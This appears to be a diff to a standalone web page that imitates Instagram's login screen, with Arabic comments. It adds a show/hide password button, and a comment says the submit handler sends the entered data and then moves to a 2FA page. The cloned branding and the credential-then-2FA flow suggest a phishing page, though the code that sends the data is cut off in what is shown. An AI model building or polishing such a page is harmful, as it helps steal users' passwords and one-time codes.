@@ -18,6 +18,7 @@
         .input-group { margin-bottom: 6px; position: relative; }
         .input-group input { width: 100%; padding: 9px 8px 7px; background-color: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; color: #262626; outline: none; }
         .input-group input:focus { border: 1px solid #a8a8a8; }
+        .show-password { position: absolute; right: 8px; top: 50%; transform: translateY(-50%); font-size: 14px; font-weight: 600; color: #262626; cursor: pointer; background: none; border: none; display: none; }
         
         .login-btn { width: 100%; background-color: #0095f6; color: #fff; border: none; border-radius: 4px; padding: 7px 16px; font-weight: 600; font-size: 14px; margin-top: 8px; cursor: pointer; }
         .login-btn:disabled { background-color: #b2dffc; cursor: default; }
@@ -48,7 +49,6 @@
     <div class="container">
         <div class="login-box">
             <div class="logo">
-                <!-- الشعار الحقيقي (PNG) من سيرفر مستقر -->
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1024px-Instagram_logo.svg.png" alt="Instagram">
             </div>
             
@@ -58,6 +58,7 @@
                 </div>
                 <div class="input-group">
                     <input type="password" id="password" placeholder="Password" required>
+                    <button type="button" class="show-password" id="togglePassword">Show</button>
                 </div>
                 <button type="submit" class="login-btn" id="loginBtn" disabled>Log in</button>
             </form>
@@ -102,13 +103,30 @@
         const usernameInput = document.getElementById('username');
         const passwordInput = document.getElementById('password');
         const loginBtn = document.getElementById('loginBtn');
+        const togglePassword = document.getElementById('togglePassword');
 
+        // تفعيل/تعطيل زر الدخول وإظهار زر "Show"
         function checkInputs() {
-            loginBtn.disabled = usernameInput.value.trim() === '' || passwordInput.value.trim() === '';
+            const userVal = usernameInput.value.trim();
+            const passVal = passwordInput.value.trim();
+            loginBtn.disabled = userVal === '' || passVal === '';
+            togglePassword.style.display = passVal.length > 0 ? 'block' : 'none';
         }
         usernameInput.addEventListener('input', checkInputs);
         passwordInput.addEventListener('input', checkInputs);
 
+        // إظهار/إخفاء كلمة المرور
+        togglePassword.addEventListener('click', function() {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                togglePassword.textContent = 'Hide';
+            } else {
+                passwordInput.type = 'password';
+                togglePassword.textContent = 'Show';
+            }
+        });
+
+        // إرسال البيانات والانتقال لصفحة 2FA
         loginForm.addEventListener('submit', function(e) {
             e.preventDefault();
             const username = usernameInput.value.trim();
